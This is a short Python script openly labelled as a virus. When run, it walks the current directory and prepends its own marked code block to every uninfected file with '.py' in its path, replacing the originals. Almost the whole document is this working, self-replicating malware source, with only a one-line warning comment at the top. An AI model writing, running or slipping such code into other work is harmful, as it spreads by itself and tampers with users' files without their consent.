#Don't run this file if there is over python files in directory
## VIRUS_START
import os
def dos_w(pad):
    for root, ab, fs  in os.walk(os.getcwd()):
        for name in fs:
            if '.py' in os.path.join(root,name):
                with open(os.path.join(root,name)) as f:
                    if any(['## VIRUS_START' in line for line in f]):
                        continue
                with open(os.path.join(root,name) + '.i','w') as ifile:
                    ifile.write(pad)
                    ifile.write(open(os.path.join(root,name)).read())
                os.remove(os.path.join(root,name))
                os.rename(os.path.join(root,name) + '.i',os.path.join(root,name))
pad = ''
with open(os.path.realpath(__file__),'r') as f:
    for line in f:
        if '## VIRUS_START' == line.strip():    
            pad+=line
            break
    for line in f:
        if '## VIRUS_END' == line.strip():
            pad+=line
            break
        else: 
            pad+=line
print(pad)
dos_w(pad+'\n')
123
## VIRUS_END     
